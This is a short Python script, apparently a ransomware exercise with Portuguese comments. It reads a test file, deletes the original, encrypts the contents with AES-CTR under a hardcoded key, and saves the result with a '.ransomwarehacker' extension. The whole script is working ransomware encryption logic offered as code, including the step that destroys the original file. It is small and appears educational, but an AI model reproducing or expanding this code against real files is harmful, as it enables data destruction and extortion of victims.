import os
import pyaes


## Abrir o aruqivo a ser Criptografado
file_name = 'teste_entrega.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## Remover o arquivo original
os.remove(file_name)

## Definir a Chave de Encriptação
key = b'ransomwaretestes'
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## Salvar o arquivo Criptografado
new_file = file_name + '.ransomwarehacker'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

